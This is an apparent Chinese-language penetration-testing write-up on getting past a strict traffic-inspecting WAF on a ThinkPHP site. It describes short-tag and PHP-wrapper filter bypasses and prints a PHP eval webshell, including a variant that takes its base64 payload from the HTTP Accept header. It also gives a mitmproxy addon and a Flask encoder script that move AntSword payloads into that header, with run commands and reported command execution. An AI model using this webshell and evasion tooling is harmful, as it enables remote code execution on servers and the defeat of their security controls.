### 流量waf绕过

碰到个thinkphp很硬的站点，php7的环境，拦截的很死，拦截`<?php`，可以通过`<? ?>`短标签绕过，拦截一些关键词`eval`等函数，可以通过php伪协议写入进行绕过

这个waf还有个比较厉害的点，流量拦截，base64、rsa、aes等流量都会识别到直接reset

base64流量如下：

![800](photo/Pasted%20image%2020220504190246.png)

直接reset，没有状态码，包括其他rsa、aes也是直接reset

rsa流量如下：

![800](photo/Pasted%20image%2020220504190259.png)

直接reset，也没有状态码


后续尝试更换payload中的关键字，发现没办法绕过，这个waf还是比较智能的

中间想到了使用伪协议写大马进服务器，发现无法写入，可能请求包数据太大，想了想其他的方法

继续尝试绕过waf，这里把`payload`更换位置，猜测waf只会识别数据包的请求体，而不会去看其他的请求头，把`payload`放到请求头里，发现服务器可以得到请求，如下：

![800](https://files.mdnice.com/user/23628/09dec26a-6bee-46d2-90b7-2376b383d2bb.png)
那么就可以把之前的马：
```php
<?
@eval(base64_decode(($_POST['x'])));
?>
```
更改为：
```php
<?
@eval(base64_decode(($_SERVER['HTTP_ACCEPT'];))); // 获取Accept的参数
?>
```
然后编写mitm脚本如下：
```python
# -*- coding:utf-8 -*-
# author:f0ngf0ng
# @Date: 2022/4/9 下午9:30
# 将post的参数转移到Accept
# 配合webshell
'''
<?  @eval(base64_decode(($_SERVER['HTTP_ACCEPT']))); ?>
'''
# 配合蚁剑的myencoder mydecoder 密码设置为x

from mitmproxy import http, ctx
from urllib.parse import unquote

class Mitm:
    def request(self, flow):
        if flow.request.host != "x.x.x.x" :
            # ctx.log.info(flow.request.host)
            return

        ctx.log.info(f"payload为 {flow.request.text}")
        payload = flow.request.text.split("x=")[1].split("&")[0] # payload参数
        flow.request.headers.add("Accept",unquote(payload) )
        flow.request.set_text(flow.request.text.replace("x=" + payload , ""))

        ctx.log.info(f"发送的请求包 = {flow.request.text}")
addons = [
    Mitm()
]
```
运行命令如下：

`mitmweb -s mitm.py --listen-port 8082`

蚁剑进行代理到本地

`127.0.0.1:8082`

点击测试连接，成功

![800](photo/Pasted%20image%2020220504190342.png)


![800](photo/Pasted%20image%2020220504190355.png)
`mitmproxy`运行界面如下

![800](photo/Pasted%20image%2020220504190409.png)

命令执行界面如下：
![800](photo/Pasted%20image%2020220504190419.png)
也可以编写`autoDecoder`的加解密脚本,如下:
```python
# -*- coding:utf-8 -*-
# author:f0ngf0ng
from flask import Flask,Response,request
from pyDes import *
import base64
app = Flask(__name__)

@app.route('/encode',methods=["POST"])
def encrypt():
    body = request.form.get('dataBody')  # 获取  post 参数 必需
    headers = request.form.get('dataHeaders')  # 获取  post 参数  可选
    body_accept = body.split("x=")[1].split("&")[0] # 获取payload
    body = body.replace("x=" + body_accept,"")

    if headers != None: # 开启了请求头加密
        print(headers + "\r\n\r\n\r\n\r\n" + body)
        headers = headers + "Accept:" + body_accept + "\r\n"
        return headers + "\r\n\r\n\r\n\r\n" + body # 返回值为固定格式，不可更改

    return  body

@app.route('/decode',methods=["POST"]) # 不解密
def decrypt():
    param = request.form.get('dataBody')  # 获取  post 参数
    return param

if __name__ == '__main__':
    app.debug = True # 设置调试模式，生产模式的时候要关掉debug
    app.run(host="0.0.0.0",port="8888")
```